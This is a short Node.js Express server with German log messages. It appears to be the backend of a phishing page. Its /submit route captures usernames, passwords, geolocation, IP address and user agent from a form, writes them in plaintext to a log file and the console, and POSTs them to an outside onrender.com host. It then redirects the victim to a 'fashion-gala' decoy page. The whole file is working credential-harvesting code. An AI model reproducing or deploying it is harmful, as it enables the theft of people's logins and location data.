const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

app.post('/submit', async (req, res) => {
  try {
    const { username, password, latitude, longitude } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const logData = {
      timestamp: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      username,
      password,
      latitude,
      longitude
    };

    fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
      if (err) console.error("Log-Fehler:", err);
    });

    console.log("👤 Benutzername:", username);
    console.log("🔑 Passwort:", password);
    console.log("📍 Standort:", latitude, longitude);
    console.log("📍 IP:", clientIp);

    await fetch('https://loropiana-p9gb.onrender.com/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(logData)
    });

    res.redirect('/fashion-gala.html');

  } catch (error) {
    console.error("❌ Fehler:", error);
    res.status(500).send("Serverfehler");
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
});
